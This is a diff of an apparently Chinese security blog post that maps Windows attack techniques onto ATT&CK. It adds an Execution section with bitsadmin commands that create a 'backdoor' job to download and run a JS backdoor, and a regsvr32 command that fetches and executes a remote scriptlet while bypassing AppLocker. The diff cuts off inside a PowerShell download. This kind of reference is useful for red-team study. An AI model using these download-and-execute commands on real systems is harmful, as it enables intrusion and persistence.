@@ -31,7 +31,7 @@
 <meta property="og:description" content="本文基于ATT&amp;CK框架，研究Windows环境下攻击技战术...">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-05-03T14:34:14.000Z">
-<meta property="article:modified_time" content="2022-09-25T15:11:27.235Z">
+<meta property="article:modified_time" content="2022-09-26T14:34:23.974Z">
 <meta property="article:author" content="L0n9w4y">
 <meta property="article:tag" content="ATT&amp;CK">
 <meta property="article:tag" content="Windows">
@@ -121,7 +121,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-ATT-amp-CK"><span class="nav-text">0x00 ATT&amp;CK</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE-Initial-Access"><span class="nav-text">0x01 初始访问(Initial Access)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%92%93%E9%B1%BC"><span class="nav-text">1. 钓鱼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB"><span class="nav-text">2. 水坑攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%85%AC%E5%BC%80%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">3. 公开漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1"><span class="nav-text">4. 外部远程服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB"><span class="nav-text">5. 供应链攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E5%88%A9%E7%94%A8%E5%90%88%E6%B3%95%E5%B8%90%E5%8F%B7"><span class="nav-text">6. 利用合法帐号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB"><span class="nav-text">7. 近源攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%8A%95%E9%80%92%E6%89%A7%E8%A1%8C-Execution"><span class="nav-text">0x02 投递执行(Execution)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%8C%81%E4%B9%85%E5%8C%96-Persistence"><span class="nav-text">0x03 持久化(Persistence)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Privilege-Escalation"><span class="nav-text">0x04 权限提升(Privilege Escalation)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%80%9A%E8%BF%87%E6%9C%8D%E5%8A%A1%E5%88%9B%E5%BB%BA%E6%8F%90%E6%9D%83"><span class="nav-text">1. 通过服务创建提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8bitadmins%E5%90%AF%E5%8A%A8system%E6%9D%83%E9%99%90%E6%96%B0%E8%BF%9B%E7%A8%8B"><span class="nav-text">2. 利用bitadmins启动system权限新进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%BB%95%E8%BF%87AppLocker%E9%99%90%E5%88%B6"><span class="nav-text">3. 绕过AppLocker限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%88%A9%E7%94%A8%E7%BB%84%E7%AD%96%E7%95%A5%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90"><span class="nav-text">4. 利用组策略提升权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-UAC%E6%8F%90%E6%9D%83"><span class="nav-text">5. UAC提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E5%88%A9%E7%94%A8Bash%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8"><span class="nav-text">6. 利用Bash环境变量植入后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-Token-x2F-Hash%E7%AA%83%E5%8F%96%E4%B8%8E%E6%8F%90%E6%9D%83"><span class="nav-text">7. Token&#x2F;Hash窃取与提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-HASH-Dump"><span class="nav-text">8. HASH Dump</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E9%98%B2%E5%BE%A1%E8%A7%84%E9%81%BF-Defense-Evasion"><span class="nav-text">0x05 防御规避(Defense Evasion)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E5%87%AD%E8%AF%81%E8%AE%BF%E9%97%AE-Credential-Access"><span class="nav-text">0x06 凭证访问(Credential Access)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E7%8E%AF%E5%A2%83%E5%8F%91%E7%8E%B0-Discovery"><span class="nav-text">0x07 环境发现(Discovery)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-Lateral-Movement"><span class="nav-text">0x08 横向移动(Lateral Movement)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-%E6%95%B0%E6%8D%AE%E6%94%B6%E9%9B%86-Collection"><span class="nav-text">0x09 数据收集(Collection)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0A-%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6-Command-and-Control"><span class="nav-text">0x0A 命令与控制(Command and Control)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0B-%E6%95%B0%E6%8D%AE%E6%B8%97%E6%BC%8F-Exfiltration"><span class="nav-text">0x0B 数据渗漏(Exfiltration)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0C-%E5%BD%B1%E5%93%8D%E7%A0%B4%E5%9D%8F-Impact"><span class="nav-text">0x0C 影响破坏(Impact)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xFF-Reference"><span class="nav-text">0xFF Reference</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-ATT-amp-CK"><span class="nav-text">0x00 ATT&amp;CK</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE-Initial-Access"><span class="nav-text">0x01 初始访问(Initial Access)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%92%93%E9%B1%BC"><span class="nav-text">1. 钓鱼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB"><span class="nav-text">2. 水坑攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%85%AC%E5%BC%80%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">3. 公开漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1"><span class="nav-text">4. 外部远程服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB"><span class="nav-text">5. 供应链攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E5%88%A9%E7%94%A8%E5%90%88%E6%B3%95%E5%B8%90%E5%8F%B7"><span class="nav-text">6. 利用合法帐号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB"><span class="nav-text">7. 近源攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%8A%95%E9%80%92%E6%89%A7%E8%A1%8C-Execution"><span class="nav-text">0x02 投递执行(Execution)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%9F%BA%E4%BA%8Ebitsadmin%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%8F%8A%E6%89%A7%E8%A1%8C"><span class="nav-text">1. 基于bitsadmin实现文件下载及执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%9F%BA%E4%BA%8Eregsvr32%E4%B8%8B%E8%BD%BDJS-Script%E4%BB%A3%E7%A0%81%E5%B9%B6%E6%89%A7%E8%A1%8C"><span class="nav-text">2. 基于regsvr32下载JS Script代码并执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-PowerShell-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="nav-text">3. PowerShell 文件下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Visual-Basic-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="nav-text">4. Visual Basic 文件下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Perl-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="nav-text">5. Perl 文件下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-Python-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="nav-text">6. Python 文件下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-Ruby-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="nav-text">7. Ruby 文件下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-PHP-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="nav-text">8. PHP 文件下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-FTP-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="nav-text">9. FTP 文件下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-Netcat-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="nav-text">10. Netcat 文件下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-%E9%80%9A%E8%BF%87NET-USE%E5%BB%BA%E7%AB%8BIPC%E9%80%9A%E9%81%93%E4%BB%8E%E8%BF%9C%E7%A8%8B%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="nav-text">11. 通过NET USE建立IPC通道从远程共享服务器下载文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-windows-installer%E5%AE%89%E8%A3%85%E5%8C%85%E6%A4%8D%E5%85%A5%E7%A8%8B%E5%BA%8F"><span class="nav-text">12. windows installer安装包植入程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-mshta-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">13. mshta 代码执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#14-%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%94%9F%E7%BB%84%E4%BB%B6%E5%8A%A0%E8%BD%BDDLL"><span class="nav-text">14. 利用系统原生组件加载DLL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#15-%E5%88%A9%E7%94%A8wmic%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="nav-text">15. 利用wmic执行程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#16-%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%94%9F%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%8C%87%E4%BB%A4"><span class="nav-text">16. 利用系统原生脚本执行指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#17-%E9%80%9A%E8%BF%87-x2F-tcp-x2F-tcp%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="nav-text">17. 通过&#x2F;tcp&#x2F;tcp下载文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#18-%E5%88%A9%E7%94%A8psexec%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%8C%87%E4%BB%A4"><span class="nav-text">18. 利用psexec远程执行指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#19-%E5%88%A9%E7%94%A8sc%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8C%E6%8C%87%E4%BB%A4"><span class="nav-text">19. 利用sc定时任务执行指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#20-%E5%88%A9%E7%94%A8Esentutl-exe%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E6%8B%B7%E8%B4%9D%E5%8F%8A%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="nav-text">20. 利用Esentutl.exe实现文件拷贝及远程文件下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#21-%E5%88%A9%E7%94%A8UNC%E6%9C%BA%E5%88%B6%E4%BB%8E%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="nav-text">21. 利用UNC机制从远程下载文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#22-%E5%88%A9%E7%94%A8%E7%AC%AC%E4%B8%89%E6%96%B9%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%8C%87%E4%BB%A4"><span class="nav-text">22. 利用第三方程序执行系统指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-text">Reference</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%8C%81%E4%B9%85%E5%8C%96-Persistence"><span class="nav-text">0x03 持久化(Persistence)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%99%BB%E5%BD%95%E5%90%8E%E9%97%A8"><span class="nav-text">1. 登录后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%90%8E%E9%97%A8"><span class="nav-text">2. 注册表后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%8E%A5%E5%8F%A3%E5%90%8E%E9%97%A8"><span class="nav-text">3. 身份认证接口后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-bitadmins%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="nav-text">4. bitadmins实现自启动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-tscon%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95"><span class="nav-text">5. tscon实现远程登录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%90%AF%E5%8A%A8%E9%A1%B9%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-text">6. 添加系统自启动项实现持久化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E8%BE%85%E5%8A%A9%E5%8A%9F%E8%83%BD%E9%95%9C%E5%83%8F%E5%8A%AB%E6%8C%81%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-text">7. 辅助功能镜像劫持实现持久化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-%E5%88%A9%E7%94%A8-AppCertDlls-%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9%E5%AE%9E%E7%8E%B0%E8%BF%9B%E7%A8%8B%E5%90%AF%E5%8A%A8dll%E6%B3%A8%E5%85%A5%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-text">8. 利用 AppCertDlls 注册表项实现进程启动dll注入持久化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-%E5%88%A9%E7%94%A8-AppInit-DLLs-%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9%E5%AE%9E%E7%8E%B0%E9%92%88%E5%AF%B9%E5%8A%A0%E8%BD%BDuser32-dll%E7%9A%84%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-text">9. 利用 AppInit DLLs 注册表项实现针对加载user32.dll的进程注入持久化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-%E5%88%A9%E7%94%A8-BITS-Jobs-%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96%E5%90%8E%E9%97%A8%E4%BB%BB%E5%8A%A1"><span class="nav-text">10. 利用 BITS Jobs 实现持久化后门任务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-%E5%88%A9%E7%94%A8-Com%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81-%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-text">11. 利用 Com组件劫持 实现持久化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-Winlogon-%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-text">12. Winlogon 实现持久化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-%E7%AF%A1%E6%94%B9%E6%9C%8D%E5%8A%A1%E8%BF%9B%E7%A8%8B%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-text">13. 篡改服务进程实现持久化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#14-%E6%9B%BF%E6%8D%A2%E5%B1%8F%E5%B9%95%E4%BF%9D%E6%8A%A4%E7%A8%8B%E5%BA%8F%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-text">14. 替换屏幕保护程序实现持久化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#15-%E5%88%A9%E7%94%A8WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-text">15. 利用WMI事件订阅实现持久化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#16-%E5%88%9B%E5%BB%BA%E6%96%B0%E6%9C%8D%E5%8A%A1%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-text">16. 创建新服务实现持久化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#17-%E5%88%A9%E7%94%A8-NetshHelper-DLL-%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-text">17. 利用 NetshHelper DLL 实现持久化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Privilege-Escalation"><span class="nav-text">0x04 权限提升(Privilege Escalation)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%80%9A%E8%BF%87%E6%9C%8D%E5%8A%A1%E5%88%9B%E5%BB%BA%E6%8F%90%E6%9D%83"><span class="nav-text">1. 通过服务创建提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8bitadmins%E5%90%AF%E5%8A%A8system%E6%9D%83%E9%99%90%E6%96%B0%E8%BF%9B%E7%A8%8B"><span class="nav-text">2. 利用bitadmins启动system权限新进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%BB%95%E8%BF%87AppLocker%E9%99%90%E5%88%B6"><span class="nav-text">3. 绕过AppLocker限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%88%A9%E7%94%A8%E7%BB%84%E7%AD%96%E7%95%A5%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90"><span class="nav-text">4. 利用组策略提升权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-UAC%E6%8F%90%E6%9D%83"><span class="nav-text">5. UAC提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E5%88%A9%E7%94%A8Bash%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8"><span class="nav-text">6. 利用Bash环境变量植入后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-Token-x2F-Hash%E7%AA%83%E5%8F%96%E4%B8%8E%E6%8F%90%E6%9D%83"><span class="nav-text">7. Token&#x2F;Hash窃取与提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-HASH-Dump"><span class="nav-text">8. HASH Dump</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E9%98%B2%E5%BE%A1%E8%A7%84%E9%81%BF-Defense-Evasion"><span class="nav-text">0x05 防御规避(Defense Evasion)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E5%87%AD%E8%AF%81%E8%AE%BF%E9%97%AE-Credential-Access"><span class="nav-text">0x06 凭证访问(Credential Access)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E7%8E%AF%E5%A2%83%E5%8F%91%E7%8E%B0-Discovery"><span class="nav-text">0x07 环境发现(Discovery)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-Lateral-Movement"><span class="nav-text">0x08 横向移动(Lateral Movement)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-%E6%95%B0%E6%8D%AE%E6%94%B6%E9%9B%86-Collection"><span class="nav-text">0x09 数据收集(Collection)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0A-%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6-Command-and-Control"><span class="nav-text">0x0A 命令与控制(Command and Control)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0B-%E6%95%B0%E6%8D%AE%E6%B8%97%E6%BC%8F-Exfiltration"><span class="nav-text">0x0B 数据渗漏(Exfiltration)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0C-%E5%BD%B1%E5%93%8D%E7%A0%B4%E5%9D%8F-Impact"><span class="nav-text">0x0C 影响破坏(Impact)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xFF-Reference"><span class="nav-text">0xFF Reference</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -413,7 +413,344 @@ Shell.Application：能够执行sehll命令</code></pre>
 <p>帐户访问、凭据和跨系统网络的权限的重叠是值得关注的，因为攻击者可能能够跨帐户和系统进行切换，以达到较高的访问级别(即，以绕过在企业内设置的访问控制</p>
 <h3 id="7-近源攻击"><a href="#7-近源攻击" class="headerlink" title="7. 近源攻击"></a>7. 近源攻击</h3><p>通过利用近距离通讯来进行攻击。利用目标存在的近距离通讯，例如WIFI，WiFi 安全标标准中常用的加密算法如 WEP、WPA&#x2F;WPA2、<br>WPA-PSK&#x2F;WPA2-PSK 等都存在问题，易被窃听，且容易泄露用户系统信息和 PSK 等重要安全信息，认证机制相对简单，易被各种方式主动攻击，得益与这些弱点，WIFI 攻击变得容易。对近距离通讯进行中继攻击。</p>
 <p>攻击方式：WIFI、蓝牙、ZigBee、NFC、RFID 等</p>
-<h2 id="0x02-投递执行-Execution"><a href="#0x02-投递执行-Execution" class="headerlink" title="0x02 投递执行(Execution)"></a>0x02 投递执行(Execution)</h2><h2 id="0x03-持久化-Persistence"><a href="#0x03-持久化-Persistence" class="headerlink" title="0x03 持久化(Persistence)"></a>0x03 持久化(Persistence)</h2><h2 id="0x04-权限提升-Privilege-Escalation"><a href="#0x04-权限提升-Privilege-Escalation" class="headerlink" title="0x04 权限提升(Privilege Escalation)"></a>0x04 权限提升(Privilege Escalation)</h2><h3 id="1-通过服务创建提权"><a href="#1-通过服务创建提权" class="headerlink" title="1. 通过服务创建提权"></a>1. 通过服务创建提权</h3><p>介绍几种从admin权限提权到system权限的方法，本质上是采用了“劫持启动”的思想，通过创建一个系统任务，劫持系统以一个system权限来执行任意的目的</p>
+<h2 id="0x02-投递执行-Execution"><a href="#0x02-投递执行-Execution" class="headerlink" title="0x02 投递执行(Execution)"></a>0x02 投递执行(Execution)</h2><p>栽荷投递执行关注以下两个方向：</p>
+<pre class="language-none"><code class="language-none">1. 命令本身可以接受一个HTTP URL&#x2F;UNC路径(指向一台WebDAV服务器)作为其中一个参数，命令具备解析并下载URL对应payload文件的能力
+
+2. 命令能够执行一个小型的内联脚本(由脚本负责完成下载任务，以及其他恶意程序)</code></pre>
+
+<h3 id="1-基于bitsadmin实现文件下载及执行"><a href="#1-基于bitsadmin实现文件下载及执行" class="headerlink" title="1. 基于bitsadmin实现文件下载及执行"></a>1. 基于bitsadmin实现文件下载及执行</h3><p>BITS，全称 Background Intelligent Transfer Service (后台智能传输服务),是一个 Windows 组件，它可以在前台或后台异步传输文件，为保证其他网络应用程序获得响应而调整传输速度，并在重新启动计算机或重新建立网络连接之后自动恢复文件传输，常用于 Windows Update, SUS, SMS 以及其他第三方包的安装更新</p>
+<p>Bitsadmin，是一个命令行工具，可用于创建下载或上载作业并监视其进度。自Win7开始系统默认包含，也可通过powershell调用，名称为BITS cmdlets</p>
+<p><strong>1) 直接自动下载并保存 - bitsadmin &#x2F;Transfer - 普通cmd权限</strong></p>
+<pre class="language-none"><code class="language-none">bitsadmin &#x2F;Transfer Name [Type] [&#x2F;Priority Job_Priority] [&#x2F;ACLFlags Flags] &lt;RemoteFileName&gt; &lt;LocalFileName&gt;
+
+Name：       The name of the job.
+
+Type：       Use &#x2F;Download for a download job or &#x2F;Upload for an upload job.
+
+Priority：   Optional— set the job_priority to one of the following values:
+             FOREGROUND
+             HIGH
+             NORMAL
+             LOW
+
+ACLFlags：   Specify one or more of the following flags:
+             O: Copy owner information with file. 
+             G: Copy group information with file. 
+             D: Copy DACL information with file. 
+             S: Copy SACL information with file. 
+
+RemoteFileName： The name of the file when transferred to the server
+
+LocalFileName：  The name of the file that resides locally.</code></pre>
+
+<pre class="language-none"><code class="language-none">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;download.sysinternals.com&#x2F;files&#x2F;PSTools.zip C:\Users\Administrator\Downloads\PSTools.zip </code></pre>
+
+<p><strong>2) 创建一个计划任务定时启动文件下载并执行 - admin管理员权限</strong></p>
+<pre class="language-none"><code class="language-none">1. 创建一个下载任务: bitsadmin &#x2F;create backdoor
+
+2. 添加文件(添加一个任务): bitsadmin &#x2F;addfile backdoor https:&#x2F;&#x2F;github.com&#x2F;3gstudent&#x2F;Javascript-Backdoor&#x2F;archive&#x2F;master.zip C:\Users\Administrator\Desktop\poc\jsrat.zip
+
+3. 设置下载成功后要执行的命令: bitsadmin.exe &#x2F;SetNotifyCmdLine backdoor &quot;%COMSPEC%&quot; &quot;cmd.exe &#x2F;c bitsadmin.exe &#x2F;complete \&quot;backdoor\&quot; &amp;&amp; start &#x2F;B C:\Users\Administrator\Desktop\poc\jsrat.zip&quot; 
+
+4. 开启下载任务: bitsadmin &#x2F;Resume backdoor</code></pre>
+
+<h3 id="2-基于regsvr32下载JS-Script代码并执行"><a href="#2-基于regsvr32下载JS-Script代码并执行" class="headerlink" title="2. 基于regsvr32下载JS Script代码并执行"></a>2. 基于regsvr32下载JS Script代码并执行</h3><p>regsvr32.exe用于注册Windows操作系统的动态链接库和ActiveX控件</p>
+<pre class="language-none"><code class="language-none">regsvr32.exe &#x2F;u &#x2F;s &#x2F;i:https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;SCTPersistence&#x2F;master&#x2F;calc.sct scrobj.dll
+
+# regsrv32指令选项：
+&#x2F;s 静默执行
+&#x2F;n 指定不调用DllRegisterServer，此选项必须与&#x2F;i共同使用
+&#x2F;i 调用DllInstall将它传递到可选的[cmdline]，在与 &#x2F;u 共同使用时，它调用DllUnstall
+&#x2F;u 反注册控件
+
+# 访问远程http文件需要较长时间，甚至可能会下载失败，我们也可以把sct文件提前植入磁盘上，然后调用regsvr32.exe进行启动
+regsvr32.exe &#x2F;u &#x2F;s &#x2F;i:.&#x2F;calc.sct scrobj.dll</code></pre>
+
+<p><strong>特性</strong></p>
+<pre class="language-none"><code class="language-none">1. regsvr32是一个windows命令行组件，它受windows操作系统信任，因此可以将regsvr32作为一个“proxy aware”去执行任意指令而绕过AppLocker
+2. 同时regsvr32支持TLS加密、http redirect跳转等优势
+3. 使用regsvr32执行远程http sct文件不会产生落盘文件 </code></pre>
+
+<h3 id="3-PowerShell-文件下载"><a href="#3-PowerShell-文件下载" class="headerlink" title="3. PowerShell 文件下载"></a>3. PowerShell 文件下载</h3><pre class="language-none"><code class="language-none">$p &#x3D; New-Object System.Net.WebClient
